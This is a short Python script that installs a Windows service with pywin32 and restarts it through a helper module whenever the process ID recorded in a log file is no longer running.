from logging.handlers import TimedRotatingFileHandler
import sys
import os
import subprocess
import logging
import inspect
import time
import zipfile,shutil

import win32serviceutil
import win32service
import win32event
from mymodule import pidFunction,trec,Th
import _safety as safety
safety.debug = False

class Service(safety.PythonService):
    pass
if len(sys.argv) == 1:
    safety.Verification()
else:
    win32serviceutil.HandleCommandLine(Service)
    print('get here')
    if 'remove' not in sys.argv:
        if not safety.debug:
             time.sleep(10)
        if not os.path.exists(safety.Hacker.alivelog):
            with open(safety.Hacker.alivelog, 'a+') as f:
                f.truncate(0)
                if safety.debug: 
                    input(1)
                safety.ForService('start')
        else:
            with open(safety.Hacker.alivelog) as f:
                mypid = f.read()
                if mypid:
                    try:
                        mypid = int(mypid)
                    except:
                        if safety.debug: 
                            input(2)
                        safety.ForService('start')
                    else:
                        if not pidFunction(pid=mypid)[0]:
                            if safety.debug:
                                 input(3)
                            safety.ForService('start')
                else:
                    with open(safety.Hacker.alivelog, 'a+') as f:
                        f.truncate(0)
                        if safety.debug: 
                            input(4)
                        safety.ForService('start')


"""
F:\迅雷下载\python-3.7.4-embed-amd64\python.exe F:\迅雷下载\python-3.7.4-embed-amd64\index.py 
"""
